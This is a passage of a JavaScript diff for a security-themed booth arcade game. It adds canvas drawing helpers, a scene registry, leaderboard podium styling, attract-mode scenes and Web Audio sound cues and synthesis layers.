+    // Approximate text height from font (parse px size; fallback 12)
+    let textH = 12;
+    if (typeof ctx.font === 'string'){
+      const fm = ctx.font.match(/(\d+(?:\.\d+)?)px/);
+      if (fm) textH = parseFloat(fm[1]);
+    }
+    const plateW = textW + padX * 2;
+    const plateH = textH + padY * 2;
+    // Plate origin computed from align/baseline so it surrounds the text
+    let px = x;
+    if (align === 'center') px = x - plateW / 2;
+    else if (align === 'right' || align === 'end') px = x - plateW;
+    else px = x;
+    let py;
+    if (base === 'middle')      py = y - plateH / 2;
+    else if (base === 'top' || base === 'hanging') py = y;
+    else if (base === 'bottom' || base === 'alphabetic' || base === 'ideographic') py = y - plateH;
+    else py = y - plateH / 2;
+    // Draw plate
+    ctx.fillStyle = plate;
+    if (radius > 0 && typeof ctx.roundRect === 'function'){
+      ctx.beginPath(); ctx.roundRect(px, py, plateW, plateH, radius); ctx.fill();
+    } else {
+      ctx.fillRect(px, py, plateW, plateH);
+    }
+    if (border){
+      ctx.strokeStyle = border; ctx.lineWidth = borderW;
+      if (radius > 0 && typeof ctx.roundRect === 'function'){
+        ctx.beginPath(); ctx.roundRect(px, py, plateW, plateH, radius); ctx.stroke();
+      } else {
+        ctx.strokeRect(px, py, plateW, plateH);
+      }
+    }
+    // Draw text
+    if (glow > 0){ ctx.shadowColor = glowCol; ctx.shadowBlur = glow; }
+    ctx.fillStyle = color;
+    ctx.fillText(str, x, y);
+    ctx.restore();
+  }
+
+  // ─── Draw.glowText — NEW: shadow-blur fillText wrapper ────────────────────
+  // opts = { font, color:'#e7f1ff', glow:8, glowColor:(=color),
+  //          align:'left', baseline:'alphabetic', stroke:null, strokeW:1 }
+  function _drawGlowText(ctx, text, x, y, opts){
+    if (!ctx || typeof ctx.fillText !== 'function') return;
+    const o = opts || {};
+    const str = String(text == null ? '' : text);
+    const color   = (typeof o.color === 'string') ? o.color : '#e7f1ff';
+    const glow    = Number.isFinite(o.glow) ? o.glow : 8;
+    const glowCol = (typeof o.glowColor === 'string') ? o.glowColor : color;
+    const align   = (typeof o.align === 'string') ? o.align : 'left';
+    const base    = (typeof o.baseline === 'string') ? o.baseline : 'alphabetic';
+    const stroke  = (typeof o.stroke === 'string') ? o.stroke : null;
+    const strokeW = Number.isFinite(o.strokeW) ? o.strokeW : 1;
+    ctx.save();
+    if (typeof o.font === 'string') ctx.font = o.font;
+    ctx.textAlign    = align;
+    ctx.textBaseline = base;
+    if (glow > 0){ ctx.shadowColor = glowCol; ctx.shadowBlur = glow; }
+    if (stroke){
+      ctx.strokeStyle = stroke;
+      ctx.lineWidth   = strokeW;
+      ctx.strokeText(str, x, y);
+    }
+    ctx.fillStyle = color;
+    ctx.fillText(str, x, y);
+    ctx.restore();
+  }
+
+  window.FalconArcade.Draw = Object.freeze({
+    panel:    _drawPanel,
+    label:    _drawLabel,
+    glowText: _drawGlowText,
+  });
+})();
+
+// ────────────────────────────────────────────────────────────────────────
+// Scenes facade — Task 8 (minimal adapter registry)
+// Exposes FalconArcade.Scenes = { register, change, update, render, current, list }
+// Adapter-wrapper strategy: does NOT take over existing scene transitions.
+// _launchGameRuntime / returnToDashboard remain the canonical entry points;
+// this registry is a parallel read-through surface for future code.
+// Spec: .claude/studio/spec-scenes-api.md (+ amend1)
+// ────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeScenes(){
+  const _scenesRegistry = Object.create(null);
+  let _scenesCurrent = '';
+
+  function _safeCall(fn, a, b){
+    if (typeof fn !== 'function') return;
+    try { fn(a, b); }
+    catch(err){ try { console.warn('[Scenes] handler error:', err); } catch(_){} }
+  }
+
+  function _register(id, scene){
+    if (typeof id !== 'string' || !id) return false;
+    if (!scene || typeof scene !== 'object') return false;
+    _scenesRegistry[id] = scene;
+    return true;
+  }
+
+  function _change(id, payload){
+    if (typeof id !== 'string' || !id) return false;
+    if (!_scenesRegistry[id]) return false;
+    if (id === _scenesCurrent) return true; // idempotent
+    const prev = _scenesCurrent;
+    const prevScene = prev ? _scenesRegistry[prev] : null;
+    // exit previous
+    if (prevScene) _safeCall(prevScene.exit, id);
+    _scenesCurrent = id;
+    // enter next
+    _safeCall(_scenesRegistry[id].enter, payload);
+    return true;
+  }
+
+  function _update(dt){
+    const s = _scenesCurrent ? _scenesRegistry[_scenesCurrent] : null;
+    if (!s) return;
+    _safeCall(s.update, dt);
+  }
+
+  function _render(ctx){
+    const s = _scenesCurrent ? _scenesRegistry[_scenesCurrent] : null;
+    if (!s) return;
+    _safeCall(s.render, ctx);
+  }
+
+  function _current(){ return _scenesCurrent; }
+  function _list(){ return Object.keys(_scenesRegistry); }
+
+  const Scenes = Object.freeze({
+    register: _register,
+    change:   _change,
+    update:   _update,
+    render:   _render,
+    current:  _current,
+    list:     _list,
+  });
+
+  window.FalconArcade = window.FalconArcade || {};
+  window.FalconArcade.Scenes = Scenes;
+
+  // ── Adapter wrappers ──
+  // Thin shims that delegate to existing globals. All `enter` functions use
+  // typeof guards so they are safe no-ops if the target global is missing.
+
+  _register('dashboard', {
+    enter(){
+      if (typeof window.returnToDashboard === 'function') window.returnToDashboard();
+    }
+  });
+
+  _register('zero-game', {
+    enter(){
+      if (typeof window._launchGameRuntime === 'function'
+          && typeof window.initGameZero === 'function'){
+        window._launchGameRuntime('game-zero-container', window.initGameZero);
+      }
+    }
+  });
+
+  _register('defense-game', {
+    enter(){
+      if (typeof window._launchGameRuntime === 'function'
+          && typeof window.initGameDefense === 'function'){
+        window._launchGameRuntime('game-defense-container', window.initGameDefense);
+      }
+    }
+  });
+
+  _register('hunt-game', {
+    enter(){
+      if (typeof window._launchGameRuntime === 'function'
+          && typeof window.initGameHunt === 'function'){
+        window._launchGameRuntime('game-hunt-container', window.initGameHunt);
+      }
+    }
+  });
+
+  _register('mission-brief', {
+    enter(payload){
+      // mission-brief is opened via launchGame(), not directly — delegate
+      if (payload && typeof payload.containerId === 'string'
+          && typeof payload.initFn === 'function'
+          && typeof window.launchGame === 'function'){
+        window.launchGame(payload.containerId, payload.initFn);
+      }
+    }
+  });
+
+  _register('form-modal', {
+    enter(payload){
+      const O = window.FalconArcade && window.FalconArcade.Overlay;
+      if (O && typeof O.showForm === 'function') O.showForm(payload || {});
+    }
+  });
+
+  _register('attract', {
+    enter(){
+      const O = window.FalconArcade && window.FalconArcade.Overlay;
+      if (O && typeof O.showAttract === 'function') O.showAttract();
+    },
+    exit(){
+      const O = window.FalconArcade && window.FalconArcade.Overlay;
+      if (O && typeof O.hideAttract === 'function') O.hideAttract('scene-change');
+    }
+  });
+
+  _register('leaderboard', {
+    // Leaderboard is an overlay; there is no single canonical opener.
+    // Adapter left with only identity + current() readability.
+    enter(){ /* no canonical opener; intentionally no-op */ }
+  });
+
+  _register('boot-loader', {
+    enter(){ /* boot-loader auto-runs on page load; no manual entry */ }
+  });
+})();
+
 // Auto-backup: snapshot ranking data to localStorage every 15 min
 // sessionStorage holds live PII rankings; this backup survives tab crash
 (function _initRankingAutoBackup(){
@@ -4597,7 +6084,7 @@ function _dashboardRankingMarkup() {
     const hero = entries[0] || { name: t.dash_rankings_empty || 'Open field', company: t.dash_rankings_waiting || 'Awaiting first run', score: 0 };
     const medals = ['🥇','🥈','🥉'];
     const rows = entries.length ? entries.map((entry, idx) => `
-      <div class="dash-rank-row ${idx === 0 ? 'is-top' : ''}">
+      <div class="dash-rank-row ${idx === 0 ? 'is-top' : ''}"${idx < 3 ? ` data-podium="${idx + 1}"` : ''}>
         <span class="dash-rank-row-rank">${medals[idx] || (idx + 1)}</span>
         <span class="dash-rank-row-name"><span class="dash-rank-row-name-icon">${group.icon}</span><span>${_esc(entry.name || '—')}</span></span>
         <span>${Number(entry.score || 0).toLocaleString()}</span>
@@ -4706,6 +6193,22 @@ function _ensureDashboardRankingOverlay() {
     .dash-rank-carousel-in { animation:dashRankIn .42s cubic-bezier(.22,1,.36,1) both; }
     @keyframes dashRankIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:none; } }
     .dash-rank-fade-out { opacity:0 !important; transform:translateY(-5px) !important; transition:opacity .18s ease, transform .18s ease; }
+    /* ── Phase 3.D — Podium prestige (top 3) ── */
+    .dash-rank-row[data-podium] { position:relative; }
+    .dash-rank-row[data-podium="1"] { background:linear-gradient(90deg, rgba(246,194,68,0.10) 0%, rgba(246,194,68,0.02) 60%, transparent 100%); }
+    .dash-rank-row[data-podium="1"] .dash-rank-row-rank { color:#f6c244; text-shadow:0 0 10px rgba(246,194,68,0.45); }
+    .dash-rank-row[data-podium="1"] .dash-rank-row-name { font-weight:800; color:#f6e3a8; }
+    .dash-rank-row[data-podium="1"] span:last-child { color:#f6c244; text-shadow:0 0 12px rgba(246,194,68,0.40); }
+    .dash-rank-row[data-podium="2"] { background:linear-gradient(90deg, rgba(205,215,223,0.08) 0%, rgba(205,215,223,0.02) 60%, transparent 100%); }
+    .dash-rank-row[data-podium="2"] .dash-rank-row-rank { color:#cdd7df; text-shadow:0 0 8px rgba(205,215,223,0.30); }
+    .dash-rank-row[data-podium="3"] { background:linear-gradient(90deg, rgba(211,139,74,0.08) 0%, rgba(211,139,74,0.02) 60%, transparent 100%); }
+    .dash-rank-row[data-podium="3"] .dash-rank-row-rank { color:#d38b4a; text-shadow:0 0 8px rgba(211,139,74,0.30); }
+    @keyframes dashRankReveal { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:translateY(0); } }
+    .dash-rank-row[data-podium] { animation:dashRankReveal 320ms cubic-bezier(0.23, 1, 0.32, 1) both; }
+    .dash-rank-row[data-podium="3"] { animation-delay:60ms; }
+    .dash-rank-row[data-podium="2"] { animation-delay:120ms; }
+    .dash-rank-row[data-podium="1"] { animation-delay:200ms; }
+    @media (prefers-reduced-motion: reduce) { .dash-rank-row[data-podium] { animation:none; } }
     /* ── Overall hero strip ── */
     .dash-rank-strip-wrap { margin-bottom:22px; position:relative; z-index:1; }
     .dash-rank-strip { display:flex; align-items:center; gap:24px; padding:18px 24px; border:1px solid color-mix(in srgb, var(--strip-color) 52%, transparent); background:radial-gradient(ellipse at 0% 50%, color-mix(in srgb, var(--strip-color) 14%, transparent) 0%, transparent 60%), linear-gradient(180deg, rgba(10,14,22,0.97), rgba(4,6,12,0.97)); box-shadow:0 0 40px color-mix(in srgb, var(--strip-color) 12%, transparent), inset 0 0 0 1px rgba(255,255,255,0.02); position:relative; overflow:hidden; }
@@ -4811,7 +6314,15 @@ function openDashboardRankings() {
   overlay.classList.add('is-open');
   _startDashboardRankingCarousel();
   _dashboardAttract?.stop?.('rankings');
-  ArcadeSonic.uiOpen();
+  // Phase 3.E — archival hall-of-fame cue on open; ArcadeSonic is a fallback
+  // when SoundEngine isn't available (kept for continuity with other open SFX).
+  try {
+    if (window.SoundEngine?.stinger) {
+      window.SoundEngine.stinger.fire('leaderboard_open');
+    } else {
+      ArcadeSonic.uiOpen();
+    }
+  } catch (_) { try { ArcadeSonic.uiOpen(); } catch(__){} }
 }
 
 function closeDashboardRankings() {
@@ -4854,6 +6365,15 @@ function showDeployOverlay(callback) {
   // Fade in
   requestAnimationFrame(() => {
     overlay.style.opacity = '1';
+    // Phase 2 Zimmer: the commit stinger has an authored silence gap (t=60–240ms)
+    // and a braam landing at t=360ms. Schedule overlay_impact to land WITH the
+    // braam (not during the silence) so the Dark Knight cut is preserved and
+    // the impact reinforces the braam attack rather than smearing it.
+    setTimeout(()=>{
+      try{
+        if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('deploy_overlay_impact');
+      }catch(_){}
+    }, 340);
   });
 
   // Call callback after intro animation
@@ -5324,14 +6844,18 @@ const CyberBootLoader = (() => {
         ctx.fillText(T('subtitle') || '', cx, cy + 52*dpr);
       }
 
-      // Skip hint
+      // Skip hint — Phase 1 polish: lifted tone + slower, softer blink + hairline
       if (t > 0.7) {
-        const blinkA = 0.4 + 0.4 * Math.sin(now * 4);
-        ctx.globalAlpha = (t - 0.7) / 0.3 * blinkA;
-        ctx.font = `${11*dpr}px "Courier New", monospace`;
-        ctx.fillStyle = '#4a4a5e';
+        const blinkA = 0.55 + 0.20 * Math.sin(now * 2.6);
+        const aOut   = (t - 0.7) / 0.3;
+        ctx.globalAlpha = aOut * blinkA;
+        // Hairline above the hint — ties to Falcon cyan palette
+        ctx.fillStyle = 'rgba(66,217,255,0.22)';
+        ctx.fillRect(cx - 46*dpr, h - 44*dpr, 92*dpr, 1*dpr);
+        ctx.font = `${10*dpr}px "Courier New", monospace`;
+        ctx.fillStyle = 'rgba(168,180,194,0.72)';
         ctx.shadowBlur = 0;
-        ctx.fillText('[ SPACE ] SKIP', cx, h - 30*dpr);
+        ctx.fillText(T('boot_skip_hint') || '[ SPACE ]  SKIP', cx, h - 28*dpr);
       }
 
       ctx.globalAlpha = 1;
@@ -5344,13 +6868,24 @@ const CyberBootLoader = (() => {
     if (done) return;
     done = true;
     running = false;
-    if (rafId) { cancelAnimationFrame(rafId); rafId = 0; }
+    if (rafId) { cancelAnimationFrame(rafId); rafId = 0;}
     document.removeEventListener('keydown', onKey);
     document.getElementById('cyber-loader')?.classList.add('is-done');
     document.body.classList.remove('arcade-loader-active');
+    // Phase 1 polish: flag the dashboard as "revealed" so the CSS one-shot
+    // entrance animation (title ignition, card stagger) fires exactly once.
+    try{ document.getElementById('dashboard-container')?.classList.add('is-revealed'); }catch(_){}
     _dashboardAttract?.resetIdle?.();
+    // Phase 1 polish: cinematic curtain-raise. Fires silently if AC is still
+    // suspended (auto-finish with no booth operator) — correct behavior for an
+    // un-touched booth. If the user skipped/clicked to finish, AC is unlocked
+    // and the Zimmer sub-drop + braam + piano + Shepard + final braam plays.
+    try{ if(window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('zimmer_curtain_raise'); }catch(_){}
     // Menu bed: start HQ atmosphere on first entry to dashboard (after user gesture)
     try{ window._startMenuBed?.(0.5); }catch(_){}
+    // Expose a post-boot catch-up hook: if boot auto-finished without a user
+    // gesture, the very first gesture after boot should fire the curtain_raise.
+    window._bootFinishedAt = Date.now();
   }
 
   function onKey(e) {
@@ -5443,6 +6978,18 @@ function _createDashboardAttractDirector() {
   const IDLE_MS = 5 * 60 * 1000;
   const SCENE_MS = 16500;
   let sceneDuration = SCENE_MS;
+  // Phase 3.C — filtered attract-bed breath.
+  // Same menu bed as dashboard (continuity), but gently breathing between
+  // 0.22 and 0.34 over a 24 s cycle. Not a different soundtrack — just a
+  // bed shift so the attract has its own atmosphere without cutting the
+  // music continuity from the menu.
+  let breathTimer = null;
+  let breathLevel = 0.30;
+  let breathDir = -1;
+  // Phase 3.B — first-render suppression for scene-swap stingers.
+  // The first scene after start() should not fire a swap cue — the
+  // attract-bed breath is the only audio cue we want for the entrance.
+  let firstRender = true;
 
   function stageEl() { return document.getElementById('dashboard-attract-stage'); }
   function overlayEl() { return document.getElementById('dashboard-attract-overlay'); }
@@ -5669,10 +7216,14 @@ function _createDashboardAttractDirector() {
     const t = window._currentLang || TRANSLATIONS.en;
     return [
       { type:'rankings', color:'#42d9ff', duration:12000 },
+      // Phase 3.A — hero-word teaser just before the matching runtime demo.
+      { type:'hero', variant:'infiltrate', color:'#f4c87a', duration:4200 },
       { type:'demo', key:'zero', color:'#ff3aa7', source:'g-zero', title:t.podZero || 'INCIDENT ZERO', tag:'RUNTIME DEMO · INCIDENT ZERO', duration:32000 },
       { type:'rankings', color:'#42d9ff', duration:12000 },
+      { type:'hero', variant:'defend', color:'#7dd3fc', duration:4200 },
       { type:'demo', key:'defense', color:'#ff8d39', source:'g-defense', title:t.podDef || 'DEFENSE', tag:'RUNTIME DEMO · PERIMETER', duration:32000 },
       { type:'rankings', color:'#42d9ff', duration:12000 },
+      { type:'hero', variant:'hunt', color:'#fca5a5', duration:4200 },
       { type:'demo', key:'hunt', color:'#aa00ff', source:'g-hunt', title:t.podHunt || 'THREAT HUNT', tag:'RUNTIME DEMO · HUNT', duration:32000 },
     ];
   }
@@ -5939,13 +7490,72 @@ function _createDashboardAttractDirector() {
       ], { duration: 700, easing: 'ease-out' }, { step: 80, start: 0 });
     }
   }
+  function renderHero(scene) {
+    // Phase 3.A — single-word hero-title scene. Pure DOM, no gameplay.
+    // Word wipes in via clip-path; subline + rule fade after.
+    const variant = scene.variant || 'infiltrate';
+    const eyebrow = T('attract_hero_eyebrow');
+    const word = T('attract_hero_' + variant + '_word');
+    const sub = T('attract_hero_' + variant + '_sub');
+    const layer = mountLayer(`
+      <div class="dash-attract-hero-panel">
+        <div class="dash-attract-hero-eyebrow">${_esc(eyebrow)}</div>
+        <div class="dash-attract-hero-word" data-variant="${variant}">${_esc(word)}</div>
+        <div class="dash-attract-hero-rule"></div>
+        <div class="dash-attract-hero-sub">${_esc(sub)}</div>
+      </div>
+    `);
+    if (!layer) return;
+    const reduced = (function(){ try { return matchMedia('(prefers-reduced-motion: reduce)').matches; } catch(_) { return false; } })();
+    const wordEl = layer.querySelector('.dash-attract-hero-word');
+    const eyebrowEl = layer.querySelector('.dash-attract-hero-eyebrow');
+    const ruleEl = layer.querySelector('.dash-attract-hero-rule');
+    const subEl = layer.querySelector('.dash-attract-hero-sub');
+    if (eyebrowEl) addSceneAnimation(eyebrowEl.animate([
+      { opacity: 0 }, { opacity: 1 }
+    ], { duration: 280, easing: 'ease-out', delay: 60, fill: 'forwards' }));
+    if (wordEl) {
+      if (reduced) {
+        wordEl.style.clipPath = 'inset(0 0 0 0)';
+        addSceneAnimation(wordEl.animate([
+          { opacity: 0 }, { opacity: 1 }
+        ], { duration: 220, easing: 'ease-out', fill: 'forwards' }));
+      } else {
+        addSceneAnimation(wordEl.animate([
+          { clipPath: 'inset(0 100% 0 0)' },
+          { clipPath: 'inset(0 0 0 0)' }
+        ], { duration: 520, easing: 'cubic-bezier(0.77, 0, 0.175, 1)', fill: 'forwards' }));
+      }
+    }
+    if (ruleEl) addSceneAnimation(ruleEl.animate([
+      { width: '0%' }, { width: '40%' }
+    ], { duration: 360, easing: 'ease-out', delay: 340, fill: 'forwards' }));
+    if (subEl) addSceneAnimation(subEl.animate([
+      { opacity: 0, transform: 'translateY(6px)' },
+      { opacity: 1, transform: 'translateY(0px)' }
+    ], { duration: 320, easing: 'ease-out', delay: 420, fill: 'forwards' }));
+  }
   function renderScene() {
     stopFrame();
     cycle = sceneDefs();
     const scene = cycle[sceneIdx % cycle.length];
     if (!scene) return;
     sceneDuration = scene.duration || SCENE_MS;
+    // Phase 3.B — fire the scene-swap stinger BEFORE mounting the new scene,
+    // so the audio cue lands just ahead of the visual reveal. Suppress on the
+    // very first render of a session (opening beat belongs to the bed breath).
+    if (!firstRender) {
+      try {
+        if (scene.type === 'hero') {
+          if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('attract_swap_hero');
+        } else {
+          if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('attract_swap');
+        }
+      } catch (_) {}
+    }
+    firstRender = false;
     if (scene.type === 'rankings') renderRankings();
+    else if (scene.type === 'hero') renderHero(scene);
     else renderDemo(scene);
     startedAt = performance.now();
     tick();
@@ -5967,8 +7577,13 @@ function _createDashboardAttractDirector() {
   function stop(reason='manual') {
     active = false;
     window._simMuted = false; // restore audio for real gameplay
+    // Phase 3.C — clear breath interval on every stop path; safe when null.
+    try{ if (breathTimer) { clearInterval(breathTimer); breathTimer = null; } }catch(_){}
     // Restore menu bed to full volume if still active (exiting attract back to dashboard)
     try{ if(_arcadeDashVisible) window._menuBedSetVolume?.(0.5); }catch(_){}
+    // Phase 3.B — reset first-render flag so the next start() doesn't fire a
+    // swap stinger on the opener.
+    firstRender = true;
     stopFrame();
     overlayEl()?.classList.remove('is-open');
     const stage = stageEl();
@@ -5989,6 +7604,17 @@ function _createDashboardAttractDirector() {
     // Attract mode: menu bed plays at reduced volume (0.3) for ambience without overpowering
     try{ window._startMenuBed?.(0.3); }catch(_){}
     try{ window._menuBedSetVolume?.(0.3); }catch(_){}
+    // Phase 3.C — begin the bed breath. 12s down, 12s up; bounds [0.22, 0.34].
+    breathLevel = 0.30; breathDir = -1;
+    try{ if (breathTimer) { clearInterval(breathTimer); breathTimer = null; } }catch(_){}
+    try{
+      breathTimer = setInterval(() => {
+        breathLevel += breathDir * 0.02;
+        if (breathLevel <= 0.22) { breathLevel = 0.22; breathDir = +1; }
+        else if (breathLevel >= 0.34) { breathLevel = 0.34; breathDir = -1; }
+        try{ window._menuBedSetVolume?.(breathLevel); }catch(_){}
+      }, 2000);
+    }catch(_){}
     sceneIdx = 0;
     overlayEl()?.classList.add('is-open');
     renderScene();
@@ -6018,9 +7644,38 @@ function _createDashboardAttractDirector() {
 
 // ── User gesture tracker — gates AudioContext creation everywhere ──
 window._userHasGestured = false;
+// Phase 1 polish: when the first gesture arrives, if boot already finished
+// silently (auto-advance path — no one was watching), fire a catch-up
+// curtain-raise so the dashboard doesn't land in dead silence.
+window._curtainRaiseFired = false;
 ['click','keydown','touchstart'].forEach(evt =>
-  document.addEventListener(evt, () => { window._userHasGestured = true; }, {once: true, capture: true})
+  document.addEventListener(evt, () => {
+    window._userHasGestured = true;
+    // Only fire catch-up if boot has already finished AND we haven't played
+    // the curtain yet (finish() plays it too, but its call is silent when AC
+    // is suspended; this gesture unlocks AC and gives us our moment).
+    try{
+      if (window._bootFinishedAt && !window._curtainRaiseFired && window.SoundEngine?.stinger) {
+        window._curtainRaiseFired = true;
+        // Slight delay so the AC resume has landed by the time we fire.
+        setTimeout(()=>{ try{ window.SoundEngine.stinger.fire('zimmer_curtain_raise'); }catch(_){} }, 60);
+      }
+    }catch(_){}
+  }, {once: true, capture: true})
 );
+// Mark curtain as fired when finish() runs post-gesture so we don't double-play.
+(function(){
+  const origFinish = null; // no-op helper placeholder — finish() is inside IIFE
+  // Observe the 'is-done' class — when cyber-loader hides AFTER gesture, we know
+  // finish() already fired its curtain, so set the flag.
+  const obs = new MutationObserver(()=>{
+    const el = document.getElementById('cyber-loader');
+    if (el && el.classList.contains('is-done') && window._userHasGestured) {
+      window._curtainRaiseFired = true;
+    }
+  });
+  try{ const el = document.getElementById('cyber-loader'); if (el) obs.observe(el, { attributes:true, attributeFilter:['class'] }); }catch(_){}
+})();
 
 // ── Boot ──
 document.addEventListener('DOMContentLoaded', () => {
@@ -6035,14 +7690,25 @@ document.addEventListener('DOMContentLoaded', () => {
   _ensureMissionBriefOverlay();
   _ensureDashboardAttractOverlay();
   _dashboardAttract = _createDashboardAttractDirector();
+  // Expose for FalconArcade.Overlay (belt-and-suspenders; the Overlay facade
+  // also reaches _dashboardAttract via closure, but cross-block callers will
+  // use this window binding).
+  window._dashboardAttract = _dashboardAttract;
   document.getElementById('card-zero').addEventListener('click', e => {
-    e.preventDefault(); launchGame('game-zero-container', initGameZero);
+    e.preventDefault();
+    // Phase 1 polish: weighty card-commit cue before game launch.
+    try{ window.SoundEngine?.stinger?.fire('zimmer_card_commit'); }catch(_){}
+    launchGame('game-zero-container', initGameZero);
   });
   document.getElementById('card-defense').addEventListener('click', e => {
-    e.preventDefault(); launchGame('game-defense-container', initGameDefense);
+    e.preventDefault();
+    try{ window.SoundEngine?.stinger?.fire('zimmer_card_commit'); }catch(_){}
+    launchGame('game-defense-container', initGameDefense);
   });
   document.getElementById('card-hunt').addEventListener('click', e => {
-    e.preventDefault(); launchGame('game-hunt-container', initGameHunt);
+    e.preventDefault();
+    try{ window.SoundEngine?.stinger?.fire('zimmer_card_commit'); }catch(_){}
+    launchGame('game-hunt-container', initGameHunt);
   });
   document.getElementById('dashboard-rankings-btn')?.addEventListener('click', () => {
     ArcadeSonic.focus();
@@ -7211,7 +8877,11 @@ const FalconRanking = (function () {
       if (validation.errors.name) _fieldError('fr-name', 'fr-name-hint', validation.errors.name);
       if (validation.errors.company) _fieldError('fr-company', 'fr-company-hint', validation.errors.company);
       if (validation.errors.email) _fieldError('fr-email', 'fr-email-hint', validation.errors.email);
-      if (!validation.ok) { _submitBtn.disabled = false; return; }
+      if (!validation.ok) {
+        // Phase 3.E — polite rejection cue on invalid submit.
+        try{ if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('leaderboard_submit_reject'); }catch(_){}
+        _submitBtn.disabled = false; return;
+      }
       const { name, company, email } = validation.cleaned;
 
       // Save entry
@@ -7226,6 +8896,9 @@ const FalconRanking = (function () {
         gameId:    CFG.gameName,
         event:     CFG.eventName,
       };
+      // Phase 3.E — official seal cue; fired just before the Store commit so
+      // the impact lands with the user's perception of "submitted".
+      try{ if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('leaderboard_submit_commit'); }catch(_){}
       const finalRank = Store.add(entry);
 
       // Particle celebration
@@ -8274,6 +9947,11 @@ let _menuPadOscs=[], _menuPadFilt=null, _menuPadLfo=null;
 let _menuShimSrc=null, _menuShimFilt=null, _menuShimGain=null, _menuShimPanLfo=null, _menuShimPan=null;
 let _menuPulseTimer=null;
 let _menuBedActive=false;
+// ── Phase 1 polish (Zimmer uplift) — additive layers ──
+// Shepard tone (3 saw voices continuously pitching up with crossfaded gains)
+let _menuShepOscs=[], _menuShepGains=[], _menuShepLfos=[], _menuShepFilt=null, _menuShepBus=null;
+// Sparse high piano stab scheduler (E6/B6/E7 bell triad) + low-brass breath
+let _menuPianoTimer=null, _menuBrassTimer=null;
 
 function _startMenuBed(volume){
   if(!_engineInit) _initSoundEngine();
@@ -8382,6 +10060,128 @@ function _startMenuBed(volume){
     }, delay);
   }
   _scheduleMenuPulse();
+
+  // ═════════════════════════════════════════════════════════════════════
+  // ── Phase 1 Zimmer uplift (additive) — three new layers ──────────────
+  //
+  //  These layers are BESPOKE to the menu bed and do not reuse River helpers
+  //  (API extraction rule: booth-grade audio fidelity wins over DRY). Each
+  //  layer has its own init + cleanup. None of the pre-existing sub/pad/
+  //  shimmer/pulse nodes are touched. Volume aggregates stay within the
+  //  menu-bed gain envelope set above.
+  // ═════════════════════════════════════════════════════════════════════
+
+  // ── Layer 1: Shepard tone tension — continuous "uneasy rise" texture ──
+  // Three saw voices sweep from base to base*8 over 16s. Each voice has its
+  // own gain LFO that fades in during the first 4s of its sweep and fades
+  // out during the last 4s, staggered by 16/3 seconds so aggregate loudness
+  // is ~constant and the ear perceives an infinite ascent (classic Shepard).
+  _menuShepFilt=ac.createBiquadFilter();
+  _menuShepFilt.type='lowpass';
+  _menuShepFilt.frequency.value=820; _menuShepFilt.Q.value=0.7;
+  _menuShepBus=ac.createGain();
+  _menuShepBus.gain.value=0.018; // quiet — this is atmosphere, not foreground
+  _menuShepFilt.connect(_menuShepBus); _menuShepBus.connect(_menuBedGain);
+  const SHEP_BASE=[55, 87.31, 138.59]; // A1, F2, C#3 — spread the crescendo across 3 octaves
+  const SHEP_SWEEP_SEC=16;
+  const SHEP_VOICES=SHEP_BASE.length;
+  _menuShepOscs=[]; _menuShepGains=[]; _menuShepLfos=[];
+  SHEP_BASE.forEach((baseF, i)=>{
+    const osc=ac.createOscillator(); osc.type='sawtooth';
+    osc.frequency.setValueAtTime(baseF, now);
+    // Infinite ascent: use a low-frequency sawtooth LFO to step the pitch in
+    // a seamless loop without relying on setValueCurveAtTime quirks.
+    // We instead re-arm the sweep in a setInterval-driven style by scheduling
+    // exponentialRampToValueAtTime at every multiple of SHEP_SWEEP_SEC.
+    const ARMS=40; // cover ~10+ minutes of menu dwell without needing re-arm in typical booth sessions
+    for(let k=0; k<ARMS; k++){
+      const tStart=now + k*SHEP_SWEEP_SEC + (i*SHEP_SWEEP_SEC/SHEP_VOICES);
+      const tEnd  =tStart + SHEP_SWEEP_SEC;
+      osc.frequency.setValueAtTime(baseF, tStart);
+      osc.frequency.exponentialRampToValueAtTime(baseF*8, tEnd);
+    }
+    // Gain envelope LFO — triangle at 1/SHEP_SWEEP_SEC Hz, scaled+biased to 0..1
+    const g=ac.createGain(); g.gain.value=0.0001;
+    // Schedule the gain as a cosine-shaped crescendo-decrescendo per sweep,
+    // phase-offset so the three voices blend.
+    for(let k=0; k<40; k++){
+      const tStart=now + k*SHEP_SWEEP_SEC + (i*SHEP_SWEEP_SEC/SHEP_VOICES);
+      const tMid  =tStart + SHEP_SWEEP_SEC*0.5;
+      const tEnd  =tStart + SHEP_SWEEP_SEC;
+      g.gain.setValueAtTime(0.0001, tStart);
+      g.gain.linearRampToValueAtTime(0.30, tMid);
+      g.gain.linearRampToValueAtTime(0.0001, tEnd);
+    }
+    osc.connect(g); g.connect(_menuShepFilt);
+    osc.start(now);
+    _menuShepOscs.push(osc); _menuShepGains.push(g);
+  });
+
+  // ── Layer 2: Sparse high piano stab — E6/B6/E7 bell triad ──
+  // Fires every 22–40s. Reads as "cold intelligence noticing something."
+  // Scheduled off of setTimeout for simplicity (no AudioParam curves needed).
+  function _schedMenuPiano(){
+    const delay=22000+Math.random()*18000;
+    _menuPianoTimer=setTimeout(()=>{
+      if(!_menuBedActive) return;
+      try{
+        const tac=AC(); const t0=tac.currentTime;
+        // Bell stack: E6 (1318.51), B6 (1975.53), E7 (2637.02) — wet, soft, decaying
+        const freqs=[1318.51, 1975.53, 2637.02];
+        const gains=[0.028, 0.020, 0.015];
+        freqs.forEach((f,idx)=>{
+          const o=tac.createOscillator(); o.type='sine'; o.frequency.value=f;
+          const g=tac.createGain(); g.gain.value=0.0001;
+          const atk=0.005 + idx*0.010; const rel=0.9 - idx*0.12;
+          const tOn=t0 + idx*0.04;
+          g.gain.setValueAtTime(0.0001, tOn);
+          g.gain.exponentialRampToValueAtTime(Math.max(0.0005, gains[idx]), tOn+atk);
+          g.gain.exponentialRampToValueAtTime(0.0001, tOn+atk+rel);
+          o.connect(g);
+          // Route through reverb if available (wet piano, Zimmer-style)
+          if(_revWetFull){ g.connect(_revWetFull); } else { g.connect(_menuBedGain); }
+          o.start(tOn); o.stop(tOn+atk+rel+0.05);
+        });
